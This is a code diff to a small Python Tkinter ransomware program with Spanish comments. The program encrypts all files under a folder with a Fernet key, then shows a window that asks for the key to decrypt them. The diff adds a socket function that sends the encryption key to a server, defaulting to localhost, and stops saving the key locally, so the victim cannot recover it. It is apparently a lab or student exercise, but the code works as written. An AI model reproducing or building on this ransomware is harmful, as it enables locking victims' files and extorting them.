@@ -3,18 +3,27 @@ from tkinter import *
 from tkinter import ttk
 import os
 import glob
+import socket
 
 
 # ************************ ENCRIPTACION ******************************
+def send_key(key, host='localhost', port=65432):
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((host, port))
+    client_socket.sendall(key)
+    client_socket.close()
+    print("Key has been sent to the server.")
 
 def generate_key():
     key = Fernet.generate_key()
-    with open('key.key', 'wb') as key_file:
-        key_file.write(key)
+    send_key(key)
+    #with open('key.key', 'wb') as key_file:
+        #key_file.write(key)
+    return key
 
 
-def load_key():
-    return open('key.key', 'rb').read()
+#def load_key():
+    #return open('key.key', 'rb').read()
 
 
 #items to encrypt
@@ -30,14 +39,14 @@ def encrypt(items, key):
             file.write(encrypted_data)
 
 
-def encrypt_files():
+def encrypt_files(key):
     path_to_encrypt = './files'
     #items = os.listdir(path_to_encrypt)
     #full_path = [path_to_encrypt + '/' + item for item in items]
     full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
     full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
-    generate_key()
-    key = load_key()
+    #generate_key()
+    #key = load_key()
 
     encrypt(full_path, key)
 
@@ -51,7 +60,7 @@ def encrypt_files():
 # ************************ DESENCRIPTACION ******************************
 
 
-def decrypt(items, key):
+def decrypt(items):
     f = Fernet(key)
     for item in items:
         with open(item, 'rb') as file:
@@ -63,8 +72,8 @@ def decrypt(items, key):
 
 
 def decrypt_files(input_key):
-    key = load_key()
-    print(key.decode('UTF-8'))
+    #key = load_key()
+    #print(key.decode('UTF-8'))
     
     if key.decode('UTF-8') != input_key:
       return False
@@ -77,7 +86,7 @@ def decrypt_files(input_key):
     full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
     full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
 
-    decrypt(full_path, key)
+    decrypt(full_path)
     return True
 
 
@@ -87,8 +96,8 @@ def decrypt_files(input_key):
 # ************************ PANTALLA ******************************
 
 def verify_key():
-  key = entry.get()
-  ret = decrypt_files(key);
+  input = entry.get()
+  ret = decrypt_files(input)
   
   if ret: 
     label4.config(text = 'Se desencriptaron los archivos')
@@ -99,7 +108,8 @@ def verify_key():
   
   
 if __name__ == '__main__':
-  encrypt_files();
+  key = generate_key()
+  encrypt_files(key)
   
   win = Tk()
   win.geometry("450x300")
